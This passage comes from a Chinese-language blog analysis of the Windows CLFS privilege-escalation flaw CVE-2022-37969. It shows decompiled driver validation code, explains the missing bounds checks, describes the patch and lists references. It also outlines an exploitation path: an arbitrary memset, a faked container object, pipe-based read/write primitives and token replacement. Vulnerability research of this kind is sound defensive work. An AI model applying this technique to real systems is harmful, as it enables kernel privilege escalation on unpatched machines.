</span></span><span style=display:flex><span>CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>ValidateProcessQNode</span>(_CLFS_VALIDATE_OFFSET_TABLE <span style=color:#f92672>*</span>,_CLFS_BASE_RECORD_HEADER <span style=color:#f92672>*</span> <span style=color:#66d9ef>const</span>,ulong,ulong <span style=color:#f92672>&amp;</span>,ulong <span style=color:#f92672>&amp;</span>)
</span></span></code></pre></div><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/21.png></p><p>从<code>CClfsBaseFilePersisted::LoadContainerQ</code> 函数开始调用堆栈为：</p><p><code>CClfsBaseFilePersisted::LoadContainerQ→CClfsBaseFile::ValidateOffsets→CClfsBaseFile::ValidateClientContextOffsets→CClfsBaseFile::ValidateCheckifWithinSymbolZone</code></p><p>函数<code>CClfsBaseFile::ValidateOffsets</code> 伪代码如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#66d9ef>__fastcall</span> CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>ValidateOffsets</span>(CClfsBaseFile <span style=color:#f92672>*</span>this, <span style=color:#66d9ef>struct</span> _CLFS_BASE_RECORD_HEADER <span style=color:#f92672>*</span><span style=color:#66d9ef>const</span> a2)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> v4; <span style=color:#75715e>// r13
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> v5; <span style=color:#75715e>// rbx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>struct</span> _RTL_AVL_TABLE <span style=color:#f92672>*</span>TableContext; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>struct</span> _CLFS_VALIDATE_OFFSET_TABLE <span style=color:#f92672>*</span>v7; <span style=color:#75715e>// rdi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>......
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  v4 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  v5 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(_QWORD <span style=color:#f92672>*</span>)(<span style=color:#f92672>*</span>((_QWORD <span style=color:#f92672>*</span>)this <span style=color:#f92672>+</span> <span style=color:#ae81ff>6</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>48</span>i64);
</span></span><span style=display:flex><span>  TableContext <span style=color:#f92672>=</span> (<span style=color:#66d9ef>struct</span> _RTL_AVL_TABLE <span style=color:#f92672>*</span>)<span style=color:#a6e22e>ExAllocatePoolWithTag</span>(PagedPool, <span style=color:#ae81ff>0x68u</span>i64, <span style=color:#ae81ff>0x73666C43u</span>);
</span></span><span style=display:flex><span>  v7 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>struct</span> _CLFS_VALIDATE_OFFSET_TABLE <span style=color:#f92672>*</span>)TableContext;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>TableContext )
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>3221225626</span>i64;
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>RtlInitializeGenericTableAvl</span>(
</span></span><span style=display:flex><span>    TableContext,
</span></span><span style=display:flex><span>    CClfsBaseFile<span style=color:#f92672>::</span>CompareGenericoffsets,
</span></span><span style=display:flex><span>    CClfsBaseFile<span style=color:#f92672>::</span>AllocOffsetNode,
</span></span><span style=display:flex><span>    CClfsLogFcbPhysical<span style=color:#f92672>::</span>ReleaseLsnMap,
</span></span><span style=display:flex><span>    TableContext);
</span></span><span style=display:flex><span>  v9 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>)(v5 <span style=color:#f92672>+</span> <span style=color:#ae81ff>104</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)v9 <span style=color:#f92672>&gt;</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int16</span> <span style=color:#f92672>*</span>)(v5 <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>9</span> )
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>goto</span> LABEL_25;
</span></span><span style=display:flex><span>  v10 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)a2 <span style=color:#f92672>+</span> <span style=color:#f92672>*</span>((<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>)a2 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1226</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>4920</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( v10 <span style=color:#f92672>&lt;</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)a2 <span style=color:#f92672>+</span> <span style=color:#ae81ff>4920</span> <span style=color:#f92672>||</span> v5 <span style=color:#f92672>+</span> v9 <span style=color:#f92672>&lt;</span> v5 <span style=color:#f92672>||</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span>)v10 <span style=color:#f92672>&gt;</span> v5 <span style=color:#f92672>+</span> v9 )
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>goto</span> LABEL_25;
</span></span><span style=display:flex><span>  v11 <span style=color:#f92672>=</span> CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>ValidateContainerContextOffsets</span>(this, v7, a2);
</span></span><span style=display:flex><span>  <span style=color:#f92672>**</span><span style=color:#a6e22e>if</span> ( v11 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>||</span> (v11 <span style=color:#f92672>=</span> CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>ValidateClientContextOffsets</span>(this, (<span style=color:#66d9ef>struct</span> _RTL_AVL_TABLE <span style=color:#f92672>*</span>)v7, a2), v11 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    <span style=color:#f92672>||</span> (v11 <span style=color:#f92672>=</span> CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>ValidateContainerSymTblOffsets</span>(this, v7, a2), v11 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    <span style=color:#f92672>||</span> (v11 <span style=color:#f92672>=</span> CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>ValidateClientSymTblOffsets</span>(this, v7, a2), v11 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) )<span style=color:#f92672>**</span>
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>LABEL_26:
</span></span><span style=display:flex><span>.....
</span></span><span style=display:flex><span>LABEL_35:
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>ExFreePoolWithTag</span>(v7, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)v11;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>该代码中通过调用<code>CClfsBaseFile::ValidateClientContextOffsets CClfsBaseFile::ValidateClientSymTblOffsets CClfsBaseFile::ValidateContainerSymTblOffsets</code>检查Client Context Offset、Container Sybbol Table等偏移是否合法。</p><p><code>CClfsBaseFile::ValidateClientContextOffsets</code>伪代码如下，该代码循环遍历检查每个<code>Container</code>并调用<code>CClfsBaseFile::ValidateCheckifWithinSymbolZone</code>检查<code>cbSymbolZone</code>是否合法。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#66d9ef>__fastcall</span> CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>ValidateClientContextOffsets</span>(
</span></span><span style=display:flex><span>        CClfsBaseFile <span style=color:#f92672>*</span>this,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>struct</span> _RTL_AVL_TABLE <span style=color:#f92672>*</span>a2,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>struct</span> _CLFS_BASE_RECORD_HEADER <span style=color:#f92672>*</span><span style=color:#66d9ef>const</span> a3)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> Symbol; <span style=color:#75715e>// ebx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> v4; <span style=color:#75715e>// r14d
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>__int64</span> v5; <span style=color:#75715e>// rdi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> v8; <span style=color:#75715e>// esi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  CClfsBaseFile <span style=color:#f92672>*</span>v9; <span style=color:#75715e>// rcx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>struct</span> _CLFS_BASE_RECORD_HEADER <span style=color:#f92672>*</span>v10; <span style=color:#75715e>// r8
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>.....
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v8 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>((_DWORD <span style=color:#f92672>*</span>)a3 <span style=color:#f92672>+</span> v5 <span style=color:#f92672>+</span> <span style=color:#ae81ff>78</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( v8 <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>0xFFFFFFFD</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#f92672>++</span>v4;
</span></span><span style=display:flex><span>      Symbol <span style=color:#f92672>=</span> CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>ValidateCheckifWithinSymbolZone</span>(this, v8 <span style=color:#f92672>+</span> <span style=color:#ae81ff>135</span>, a3);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( Symbol <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span> )
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> LABEL_15;
</span></span><span style=display:flex><span>      Symbol <span style=color:#f92672>=</span> CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>ValidateCheckifWithinSymbolZone</span>(v9, v8 <span style=color:#f92672>-</span> <span style=color:#ae81ff>48</span>, v10);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( Symbol <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span> )
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> LABEL_15;
</span></span><span style=display:flex><span>      v11 <span style=color:#f92672>=</span> CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>OffsetToAddr</span>(this, v8);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>v11 )
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> LABEL_15;
</span></span><span style=display:flex><span>      v12 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(v11 <span style=color:#f92672>-</span> <span style=color:#ae81ff>3</span>);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( v12 <span style=color:#f92672>!=</span> v8 )
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> LABEL_15;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>*</span>(v11 <span style=color:#f92672>-</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672>!=</span> v12 <span style=color:#f92672>+</span> <span style=color:#ae81ff>136</span> )
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> LABEL_15;
</span></span><span style=display:flex><span>      v19 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>      Symbol <span style=color:#f92672>=</span> CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>GetSymbol</span>(this, v8, v5, <span style=color:#f92672>&amp;</span>v19);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( Symbol <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span> )
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> LABEL_15;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>*</span>((<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int8</span> <span style=color:#f92672>*</span>)v19 <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>) <span style=color:#f92672>!=</span> (_DWORD)v5 )
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> LABEL_15;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>*</span>(_DWORD <span style=color:#f92672>*</span>)v19 <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1040322553</span> )
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> LABEL_15;
</span></span><span style=display:flex><span>      Buffer <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>((_DWORD <span style=color:#f92672>*</span>)a3 <span style=color:#f92672>+</span> v5 <span style=color:#f92672>+</span> <span style=color:#ae81ff>78</span>) <span style=color:#f92672>-</span> <span style=color:#ae81ff>48</span>;
</span></span><span style=display:flex><span>      inserted <span style=color:#f92672>=</span> <span style=color:#a6e22e>RtlInsertElementGenericTableAvl</span>(a2, <span style=color:#f92672>&amp;</span>Buffer, <span style=color:#ae81ff>8u</span>, <span style=color:#f92672>&amp;</span>NewElement);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>NewElement <span style=color:#f92672>||</span> <span style=color:#f92672>!</span>inserted )
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> LABEL_15;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    v5 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)(v5 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span> ( (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)v5 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x7C</span> );
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( v4 <span style=color:#f92672>!=</span> CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>ClientCount</span>(this) )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>......
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)Symbol;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>CClfsBaseFile::ValidateCheckifWithinSymbolZone</code>函数检查<code>cbSymbolZone</code>偏移是否处于政策范围内（处于BASE_RECORD_HEADER和BASE_RECORD之间）</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#66d9ef>__fastcall</span> CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>ValidateCheckifWithinSymbolZone</span>(
</span></span><span style=display:flex><span>        CClfsBaseFile <span style=color:#f92672>*</span>this,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> a2,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>struct</span> _CLFS_BASE_RECORD_HEADER <span style=color:#f92672>*</span>a3)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( a2 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x1338</span> <span style=color:#f92672>||</span> a2 <span style=color:#f92672>-</span> <span style=color:#ae81ff>4920</span> <span style=color:#f92672>&gt;</span> <span style=color:#f92672>*</span>((_DWORD <span style=color:#f92672>*</span>)a3 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1226</span>) )
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>3222929421</span>i64;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=小结>小结</h3><p>这次漏洞的造成原因是自身的<code>SignatureOffset</code>和自身的<code>Signatures</code>相交，导致攻击者可以利用循环写入<code>Signatures</code>的时候覆盖<code>SignatureOffset</code>，从而绕过<code>ResetLog</code>中的边界检查，同时未检查<code>BASE_RECORD_HEADER</code> + cbSymbolZone是否位于当前的<code>BASE_RECORD</code>中，导致攻击者可以利用漏洞通过memset函数对任意地址的一定大小的内存进行清零。</p><p>在实际利用中通过清零pContainer指针的高五位同时在用户层通过堆布局伪造CClfsContainer对象，在解引用对象指针时获取到执行代码的时机。通过结合Pipe对象和内核的两个函数成功获得任意读和任意写，从而成功将当前进程的Token替换成系统进程的token，达成提权。利用过程</p><p>在漏洞补丁中增加了对<code>cbSymbolZone</code>和<code>Client Context</code>的检查从而在漏洞利用初期阻断。</p><p>总的来说该漏洞形成原因是代码调用某些函数时未检查边界且该边界用户可控或间接可控。</p><p><strong>参考链接</strong></p><blockquote><p><a href=https://github.com/fortra/CVE-2022-37969 target=_blank>https://github.com/fortra/CVE-2022-37969</a></p><p><a href=https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part2-exploit-analysis target=_blank>https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part2-exploit-analysis</a></p><p><a href=https://mp.weixin.qq.com/s/GMzbavzltM756Fb8lw6h_A target=_blank>https://mp.weixin.qq.com/s/GMzbavzltM756Fb8lw6h_A</a></p><p><a href=https://bbs.kanxue.com/thread-275566.htm#msg_header_h3_0 target=_blank>https://bbs.kanxue.com/thread-275566.htm#msg_header_h3_0</a></p><p><a href=https://www.geoffchappell.com/ target=_blank>https://www.geoffchappell.com/</a></p><p><a href=https://github.com/ionescu007/clfs-docs target=_blank>https://github.com/ionescu007/clfs-docs</a></p><p><a href=https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf target=_blank>https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf</a></p><p><a href=https://www.52pojie.cn/thread-1817452-1-1.html target=_blank>https://www.52pojie.cn/thread-1817452-1-1.html</a></p></blockquote><p><strong>Created at 2023-05-26T10:56:00+08:00</strong></p><div class=article-container></div><script src=https://utteranc.es/client.js repo=CppXL/blog_comment issue-term=pathname theme=github-light crossorigin=anonymous async></script></div><div id=comments></div><footer class=footline></footer></div></div><div id=navigation><a class="nav nav-prev" href=/zh-cn/vulnerability/windows-clfs-eop/cve-2023-28252/ title=CVE-2023-28252><i class="fa fa-chevron-left"></i></a>
<a class="nav nav-next" href=/zh-cn/vulnerability/cve-2023-6553-wordpress-backup-migration-plugin-rce/ title="CVE 2023 6553 Wordpress Backup Migration Plugin RCE" style=margin-right:0><i class="fa fa-chevron-right"></i></a></div></section><div style=left:-1000px;overflow:scroll;position:absolute;top:-1000px;border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px><div style=border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px></div></div><script src=/js/clipboard.min.js?1704388116></script><script src=/js/perfect-scrollbar.min.js?1704388116></script><script src=/js/perfect-scrollbar.jquery.min.js?1704388116></script><script src=/js/jquery.sticky.js?1704388116></script><script src=/js/featherlight.min.js?1704388116></script><script src=/js/highlight.pack.js?1704388116></script><script>hljs.initHighlightingOnLoad()</script><script src=/js/modernizr.custom-3.6.0.js?1704388116></script><script src=/js/learn.js?1704388116></script><script src=/js/hugo-learn.js?1704388116></script><script src=/mermaid/mermaid.js?1704388116></script><script>mermaid.initialize({startOnLoad:!0})</script><script>(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)})(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-105947713-1","auto"),ga("send","pageview")</script></body></html>